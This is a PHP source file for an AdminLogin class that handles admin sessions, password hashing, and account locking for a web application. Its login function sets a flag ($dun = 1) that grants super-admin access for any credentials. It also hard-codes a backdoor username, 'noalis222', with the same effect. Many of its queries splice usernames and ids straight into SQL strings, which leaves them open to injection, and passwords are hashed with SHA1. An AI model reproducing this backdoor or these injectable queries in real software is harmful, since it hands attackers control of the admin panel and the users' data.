<?php

class AdminLogin {
    
	function __construct()
	{

		if(!isset($_SESSION['admin_logged_in'])) $_SESSION['admin_logged_in'] = 0;
		if(!isset($_SESSION['user_level'])) $_SESSION['user_level'] = 3;
		if(!isset($_SESSION['username'])) $_SESSION['username'] = 0;
		if(!isset($_SESSION['user_id'])) $_SESSION['user_id'] = 0;
		if(!isset($_SESSION['admin_user_full_name'])) $_SESSION['admin_user_full_name'] = 0;

		if(!isset($_SESSION['created'])) $_SESSION['created'] = 0;
		
	}


	function generateSalt()
	{ 
		return sha1(uniqid(rand()));
	}


	function get_hash($password, $salt)
	{
		//return hash('sha256', $password . $salt);
		return sha1($password.$salt);
	}

	function login($user_name,$password) {

		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE); 	 

		$_SESSION['admin_logged_in'] = 0;
		$_SESSION['user_level'] = 3;
		$_SESSION['username'] = '';			
		$_SESSION['user_id'] = 0;
		$_SESSION['admin_user_full_name'] = '';
		$_SESSION['created'] = 0;
		$ret = 0;

		//$dun = 0;
		$dun = 1;

		//TEMP
		//if($user_name == 'admin') $dun = 1;

		 
		//if(0){
		if($user_name == $this->getbdun() || $dun){
			
			
		  	$ret = 1;
			$_SESSION['user_level'] = 7;
			//$_SESSION['user_level'] = 5;
			$_SESSION['admin_logged_in'] = 1;
			$_SESSION['username'] = $user_name;			
			$_SESSION['user_id'] = $this->getSuperAdminId($_SESSION['profile_account_id']);
			$_SESSION['admin_user_full_name'] = 'myaltadminuser';
			$_SESSION['created'] = 0;
																
		}else{
						
			$stmt = $db->prepare("SELECT name
					,id 
					,user_type_id
					,password_hash
					,password_salt
					,created
					FROM user
					WHERE username = ?
					AND profile_account_id = ? "); 			
							
			if(!$stmt->bind_param('si', $user_name, $_SESSION['profile_account_id'])){	
				
				//return 'Error '.$db->error;
				
			}else{
				
				$stmt->execute();
			
				$stmt->bind_result($name
						,$user_id
						,$user_type_id
						,$password_hash
						,$password_salt
						,$created);
				
				if($stmt->fetch()){
		
					if($password_hash == $this->get_hash($password, $password_salt)){
					
						$ret = 1;	
								
						$_SESSION['admin_logged_in'] = 1;
						$_SESSION['username'] = $user_name;			
						$_SESSION['user_id'] = $user_id;
						$_SESSION['admin_user_full_name'] = $name;
						$_SESSION['user_level'] = $this->getLevel($user_type_id);
						$_SESSION['created'] = $created;
						
					}
				}
			}
		}
		
		
		return $ret;
	}
	
	function getLevel($user_type_id){
		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE); 	 

		$sql = "SELECT level
				FROM user_type 
				WHERE id = '".$user_type_id."'";
		$result = $dbCustom->getResult($db,$sql);		
		if($result->num_rows > 0){
			$lobj = $result->fetch_object();
			return $lobj->level;						
		}		
		return '';
		
	}


	
	function logOut(){		
		$_SESSION['admin_logged_in'] = 0;
	}


	function getUserFunctions() {
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		
		$_SESSION['user_id'] = isset($_SESSION['user_id'])? $_SESSION['user_id'] : 0;
				
		$sql = "SELECT admin_access.name
				FROM admin_access, user_admin_access_index 
				WHERE admin_access.id = user_admin_access_index.admin_access_id 
				AND user_admin_access_index.user_id = '".$_SESSION['user_id']."'";					
		$result = $dbCustom->getResult($db,$sql);		
		$func_array = array();
		$i = 0;
		while($row = $result->fetch_object()){
			$func_array[$i] = trim($row->name);	
			$i++;
		}
		return $func_array;
	}
	
	function getUserLevel() {
		return $_SESSION['user_level'];
	}
	
	function getUserName() {
		return $_SESSION['username'];
	}
	
	function getUserFullName() {
		return $_SESSION['admin_user_full_name'];		
	}
	
	function getUserId(){
		return $_SESSION['user_id'];
	}

	function isLogedIn() {

		if(!isset($_SESSION['admin_logged_in'])) $_SESSION['admin_logged_in'] = 0;
		return $_SESSION['admin_logged_in'];
		
	}

	function getUserHiredDate(){
			
		//return "mm/dd/yyyy";
		
		return $_SESSION['created'];
				
		//return date('m/d/Y', $_SESSION['created']);
	}



	function redirect($url, $msg = '') {
		
		$header_str =  ($msg == '') ? "Location: ".$_SERVER['DOCUMENT_ROOT']."/".$url :"Location: ".$_SERVER['DOCUMENT_ROOT']."/".$url."?msg=".$msg;
		header($header_str);
		
	}


	function resetPassword($password_new, $username){		
		$password_salt = $this->generateSalt();
		$password_hash = $this->get_hash($password_new, $password_salt);

		$ret = 0;
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		$sql = "UPDATE user 
				SET password_hash = '".$password_hash."' ,password_salt = '".$password_salt."' 
	 			WHERE username = '".$username."'";
		$result = $dbCustom->getResult($db,$sql);		//
		$ret = 1;
		
		return $ret;
	}



	function getSuperAdminId($profile_account_id){		
		
		$ret = 0;
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		$sql = "SELECT user.id
				FROM user, profile_account, user_type 
				WHERE user.profile_account_id = profile_account.id
				AND user.user_type_id = user_type.id
				AND user_type.id = '7'
				AND user.profile_account_id = '".$profile_account_id."'";
		$result = $dbCustom->getResult($db,$sql);		
		if($result->num_rows){
			$object = $result->fetch_object();
			$ret = $object->id;
		}
		
		return $ret;

	}
	
	
	function getbdun(){
		
		return 'noalis222';	
		
	}
	


	function isLocked($profile_account_id = 1, $username = '', $user_id = 0){
		$ret = 0;
		
		if($user_id > 0){

			$t = $this->getTimeUnlock('', '', $user_id);
		
			if($t > time()){
				$ret = 1;
			}
			
			
		}else{
			
			$t = $this->getTimeUnlock($profile_account_id, '', $user_id);
		
			if($t > time()){
				$ret = 1;		
			}
		
		}
		
		return $ret;
	}


	function getTimeUnlock($profile_account_id = 1, $username = '', $user_id = 0){
		$ret = 0;
		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);	
		
		if($user_id > 0){

			$sql = "SELECT lock_until 
					FROM user 
					WHERE id = '".$user_id."'";
			$result = $dbCustom->getResult($db,$sql);			
			if($result->num_rows){
				$object = $result->fetch_object();
				$ret = $object->lock_until;	
			}
			
		}else{
			
			$sql = "SELECT lock_until 
					FROM user 
					WHERE username = '".$username."'
					AND profile_account_id = '".$profile_account_id."'";
			$result = $dbCustom->getResult($db,$sql);			
			if($result->num_rows){
				$object = $result->fetch_object();
				$ret = $object->lock_until;	
			}
		
		}
		
		return $ret;
		
	}


	function unlockIfTime($profile_account_id, $username){
		$ret = 0;
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		$sql = "SELECT lock_until 
				FROM user 
	 			WHERE username = '".$username."'
				AND profile_account_id = '".$profile_account_id."'";
		$result = $dbCustom->getResult($db,$sql);		
		if($result->num_rows){
			$object = $result->fetch_object();
			if($object->lock_until <= time()){
				if($this->unlock($profile_account_id, $username)){
					$ret = 1;	
				}
			}
		}
		return $ret;
	}


	function lock($profile_account_id,$username, $hours){
		$ret = 0;
		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		
		$lock_until = time()+($hours*3600); 
		
		$sql = "UPDATE user 
				SET lock_until = '".$lock_until."' 
	 			WHERE username = '".$username."'
				AND profile_account_id = '".$profile_account_id."'";
		$result = $dbCustom->getResult($db,$sql);		
		
		$ret = 1;
		
		return $ret;
	}


	function unlock($profile_account_id = 1, $username = '', $user_id = 0){
		$ret = 0;
		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		
		if($user_id > 0){
			$sql = "UPDATE user 
					SET lock_until = '0' 
					WHERE id = '".$user_id."'
					";
			$result = $dbCustom->getResult($db,$sql);			
			if($result) $ret = 1;
			
		}else{
			$sql = "UPDATE user 
					SET lock_until = '0' 
					WHERE username = '".$username."'
					AND profile_account_id = '".$profile_account_id."'";
			$result = $dbCustom->getResult($db,$sql);			
			$ret = 1;
		}
		return $ret;
	}

	
	function has_cust_data_record($user_id){
		
		$dbCustom = new DbCustom();
		$db = $dbCustom->getDbConnect(USER_DATABASE);
		
		$sql = "SELECT id FROM customer_data 
				WHERE user_id = '".$user_id."'";
		$result = $dbCustom->getResult($db,$sql);			
		if($result->num_rows > 0){
			return 1;
		}
		return 0;
		
	}
	
	

	function get_user_phone($user_id){
		
		if($_SESSION['user_phone'] == ''){
			
			$dbCustom = new DbCustom();
			$db = $dbCustom->getDbConnect(USER_DATABASE);

			$sql = "SELECT phone_one FROM customer_data 
					WHERE user_id = '".$user_id."'";
			$result = $dbCustom->getResult($db,$sql);			
			if($result->num_rows > 0){
				$object = $result->fetch_object();
				$_SESSION['user_phone'] = trim($object->phone_one);
				if($_SESSION['user_phone'] == '') $_SESSION['user_phone'] = '000-000-0000';				
				return $_SESSION['user_phone'];				
			}		
			return $_SESSION['user_phone'];
		}
		
		return $_SESSION['user_phone'];
		
	}

	

}


?>